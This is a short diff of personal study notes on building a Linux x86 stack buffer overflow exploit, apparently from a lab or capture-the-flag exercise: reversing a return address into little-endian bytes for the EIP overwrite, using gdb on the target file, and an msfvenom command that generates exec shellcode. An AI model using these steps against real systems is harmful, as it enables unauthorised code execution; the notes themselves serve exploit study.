@@ -49,6 +49,8 @@ take four of them and reverse one of with \x between them in the script
 0xf7de3b59 = \x59\x3b\xde\xf7
 put them in the eip section of the code
 
+if errors make sure to redo the debugger. also if i can only exploit a certain file i need to break that 
+specific file on the machine with gdb and then find the address.
 
 msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python
 replace this code with shellcode
